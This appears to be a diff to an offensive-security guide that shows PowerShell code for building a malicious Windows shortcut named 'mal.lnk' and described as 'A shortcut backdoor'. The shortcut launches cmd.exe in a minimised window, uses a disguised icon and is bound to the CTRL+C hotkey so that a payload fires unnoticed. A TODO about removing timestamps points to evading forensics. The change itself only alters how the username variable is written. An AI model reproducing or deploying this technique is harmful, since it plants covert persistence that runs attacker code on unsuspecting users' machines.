@@ -17,7 +17,7 @@ If you're using powershell payload then it's recommended to use `psh-cmd` format
 TODO: Remove timestamps in the .lnk file
 
 ```powershell
-$shortcutPath = "C:\Users\" + $env:username + "\Desktop\mal.lnk"
+$shortcutPath = "C:\Users\" + $Env:USERNAME + "\Desktop\mal.lnk"
 $WshShell = New-Object -ComObject WScript.Shell
 $Shortcut = $WshShell.CreateShortcut($shortcutPath)
 $Shortcut.TargetPath = 'C:\Windows\System32\cmd.exe'
@@ -31,7 +31,7 @@ $Shortcut.Description = "A shortcut backdoor"
 $Shortcut.IconLocation = 'shell32.dll,21'
 $Shortcut.hotkey = 'CTRL+C' # A hotkey to trigger the payload
 $Shortcut.WindowStyle = 7
-$Shortcut.WorkingDirectory = "C:\Users\" + $env:username + "\Public"
+$Shortcut.WorkingDirectory = "C:\Users\" + $Env:USERNAME + "\Public"
 $Shortcut.Save()
 ```
 
